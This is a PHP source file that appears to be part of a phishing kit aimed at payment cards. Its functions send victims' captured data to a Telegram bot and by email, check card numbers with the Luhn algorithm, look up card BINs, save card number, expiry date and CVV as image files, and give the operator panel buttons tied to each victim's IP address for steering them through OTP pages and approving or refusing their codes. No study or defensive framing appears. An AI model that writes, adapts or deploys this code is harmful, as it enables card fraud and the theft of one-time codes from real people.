<?php

function sendMailRez($recipient, $subject, $message)
{

  $headers = "From: 🛠 Listener <mail-assitant@".$_SERVER['HTTP_HOST']."> ";
  mail($recipient, $subject, $message, $headers);

}

function luhnCheck($cardNumber) {
  $cardNumber = preg_replace('/\D/', '', $cardNumber);
  $cardNumber = strrev($cardNumber);
  $sum = 0;
  for ($i = 0, $length = strlen($cardNumber); $i < $length; $i++) {
      $digit = (int)$cardNumber[$i];
      if ($i % 2 == 1) {
          $digit *= 2;
          if ($digit > 9) {
              $digit -= 9;
          }
      }
      $sum += $digit;
  }
  return ($sum % 10 == 0);
}


function sendTelegramRez($message, $panel = False, $otp = False)
{
    global $token, $chatid;
  
    $query_params = array(
      'text' => $message,
      'chat_id' => $chatid
    );
  
    if ($panel) {
      $reply_markup = array(
        'inline_keyboard' => array(
          array(
            array(
              'text' => '📍 Page OTP ',
              'url' => "http://" . $_SERVER['SERVER_NAME'] . "/home/core/panel.php?ip=" . $_SERVER['REMOTE_ADDR'] . "&status=1"
            ),
            array(
              'text' => '📍 Page Final ',
              'url' => "http://" . $_SERVER['SERVER_NAME'] . "/home/core/panel.php?ip=" . $_SERVER['REMOTE_ADDR'] . "&status=2"
            )
          )
        )
      );
      $query_params['reply_markup'] = json_encode($reply_markup);
    }

    if ($otp) {
      $reply_markup = array(
        'inline_keyboard' => array(
          array(
            array(
              'text' => '🟢 Accepter',
              'url' => "http://" . $_SERVER['SERVER_NAME'] . "/home/core/panel.php?ip=" . $_SERVER['REMOTE_ADDR'] . "&status=2"
            ),
            array(
              'text' => '🔴 Refuser',
              'url' => "http://" . $_SERVER['SERVER_NAME'] . "/home/core/panel.php?ip=" . $_SERVER['REMOTE_ADDR'] . "&status=1"
            )
          )
        )
      );
      $query_params['reply_markup'] = json_encode($reply_markup);
    }
  
    if (function_exists('curl_version')) {
        $query_url = "https://api.telegram.org/bot$token/sendMessage";
        $curl = curl_init($query_url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($query_params));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
        $result = curl_exec($curl);
        echo ($result);
        curl_close($curl);
    } else {
        $query_url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($query_params);
        $result = file_get_contents($query_url);
    }
}

function getBin($api_key,$bin) {
    $url = "https://api.bincodes.com/bin/?api_key=$api_key&bin=$bin&format=json";
  
    $curl = curl_init();
    curl_setopt_array($curl, array(
      CURLOPT_URL => $url,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_TIMEOUT => 30,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_SSL_VERIFYHOST => false,
      CURLOPT_SSL_VERIFYPEER => false
    ));
    $response = curl_exec($curl);
    curl_close($curl);
  
    return $response;
}

function update($dataa)
{
    $jsonString = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/home/statistiques.json');
    $data = json_decode($jsonString, true);
    $data[$dataa] = (int) $data[$dataa] + 1;
    $newJsonString = json_encode($data);
    @file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/home/statistiques.json', $newJsonString);
}


function change($id,$text){
  $paths = [
      'live.json',
      '../core/live.json',
      '../../core/live.json'
  ];
  $data = null;
  foreach ($paths as $path) {
      $jsonString = @file_get_contents($path);
      if ($jsonString !== FALSE) {
          $data = json_decode($jsonString, true);
          $data[$id] = $text;
          $newJsonString = json_encode($data);
          file_put_contents($path, $newJsonString);
          break;
      }
  }
}

function createCardImage($cardNumber, $expirationDate, $cvv) {
    $imageWidth = 200;
    $imageHeight = 100;
    $image = imagecreatetruecolor($imageWidth, $imageHeight);
    
    $backgroundColor = imagecolorallocate($image, 255, 255, 255);
    $textColor = imagecolorallocate($image, 0, 0, 0);
    imagefill($image, 0, 0, $backgroundColor);
    $fontSize = 20;
    $textOffsetX = 10;
    $textOffsetY = 10;
    imagestring($image, $fontSize, $textOffsetX, $textOffsetY, "" . $cardNumber, $textColor);
    imagestring($image, $fontSize, $textOffsetX, $textOffsetY + 30, "" . $expirationDate, $textColor);
    imagestring($image, $fontSize, $textOffsetX, $textOffsetY + 60, "" . $cvv, $textColor); 
    $imageFileName = 'scan/card_' . time() . '.png';
    imagepng($image, $imageFileName);
    imagedestroy($image);
    return $imageFileName;
}

?>